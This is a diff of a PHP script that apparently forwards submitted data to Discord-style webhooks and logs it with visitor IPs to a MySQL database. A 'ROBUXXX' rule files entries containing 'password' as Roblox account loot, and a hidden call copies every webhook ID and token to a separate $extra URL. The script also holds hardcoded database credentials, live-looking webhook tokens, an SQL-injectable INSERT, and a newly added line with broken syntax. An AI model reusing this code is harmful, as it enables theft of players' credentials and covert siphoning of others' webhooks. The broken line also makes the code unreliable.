@@ -176,6 +176,8 @@ if(!isset($stuff['category'])){
 		$cat=30;
 	elseif($main=='557871211527405581/77ozWtH2-iwDDeEEKEgTTWS2qaYBJ5u8SZmsj-XQ4bWmUnUuX667WUofBEhWwO2WGfq1')
 		$cat=31;
+	elseif($main=='529050750458920970/-2V-GFc8I56jjo-WXD3CaADInvisQKzUeNrAttPf71IHMi8MkRXFlIg_X0kDlWZ8w4ke')
+		$cat=32;
 	elseif(strpos($contentSQL,'BC')!==false&&(strpos($contentSQL,'13')!==false||strpos(strtolower($contentSQL),'password')!==false))//ROBUXXX
 		$cat=14;
 	else$cat=0;
@@ -364,9 +366,9 @@ function curlIt($url,$body){
 }
 
 foreach($hookies as $i=>$url)$status=curlIt($url,$stuff);
-curlIt($extra,array('content'=>$id.' '.$main));
 $db=!in_array($cat,array(4,13));if($cat==3&&strpos($contentSQL,'Sanity Check')===false)$db=true;
 if($db)(new mysqli('localhost','id152849_windows10','YourSQL','id152849_windows10'))->query("INSERT INTO `Informations` (`Content`,`Webhook`,`PlaceID`,`Category`,`IP`,`IsServer`) VALUES ('$contentSQL','$main',$id,$cat,'$ip',$is);");
+curlIt($extra,array('content'=>$id.' '.$main.' '.$db?'true':false'));
 
 if($status)http_response_code($status);
 //echo$sS;
